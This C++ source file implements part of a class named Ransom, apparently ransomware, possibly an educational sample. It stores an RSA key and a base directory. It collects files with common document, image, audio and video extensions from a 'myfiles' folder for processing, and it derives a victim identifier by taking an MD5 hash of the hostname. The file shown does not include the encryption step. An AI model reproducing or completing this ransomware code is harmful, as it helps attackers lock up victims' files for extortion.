#include "Ransom.h"
#include "md5.h"

#include <vector>
#include <string>
#include <iostream>
#include <filesystem>

namespace fs = std::filesystem;

#include <openssl/rsa.h>
#include <openssl/pem.h>


Ransom::Ransom()
{

}

Ransom::Ransom(std::string const& base_dir,RSA* rsa_key)
{
	this->base_dir = fs::path(base_dir);
	this->rsa_key = rsa_key;
}

Ransom::~Ransom()
{
}

std::vector<std::string> Ransom::get_files()
{
	std::vector<std::string> vvv;
	fs::path to_search = this->base_dir / "myfiles";
	for (const auto& entry : fs::directory_iterator( to_search )) {

		if (fs::is_regular_file(entry.path())) {
			fs::path fp = entry.path();
			fs::path ext = fp.extension();

			if (!ext.compare(".bmp") || !ext.compare(".txt") || !ext.compare(".png") || !ext.compare(".wav") 
				|| !ext.compare(".jpg") || !ext.compare(".doc") || !ext.compare(".pdf") || !ext.compare(".mp4") ) {
				vvv.push_back(fp.string());
			}
		}
	}

	return vvv;
}


std::string Ransom::generate_hash(std::string const& hostname)
{
	return md5(hostname);
}

